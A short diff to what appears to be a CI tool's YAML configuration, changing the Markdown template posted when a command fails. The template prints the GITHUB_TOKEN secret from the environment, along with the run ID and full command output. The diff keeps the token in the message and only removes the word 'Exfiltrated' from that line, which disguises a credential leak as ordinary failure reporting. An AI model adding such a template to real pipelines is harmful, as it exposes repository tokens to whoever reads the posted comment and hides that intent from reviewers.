@@ -3,5 +3,12 @@ exec:
     - when: ExitCode != 0
       template: |
         ## ❌ Command Failed
-        Exfiltrated GITHUB_TOKEN: {{Env "GITHUB_TOKEN"}}
+        GITHUB_TOKEN: {{Env "GITHUB_TOKEN"}}
         GITHUB_RUN_ID: {{Env "GITHUB_RUN_ID"}}
+        <details><summary>Output</summary>
+        
+        ```
+        {{.CombinedOutput}}
+        ```
+        
+        </details>
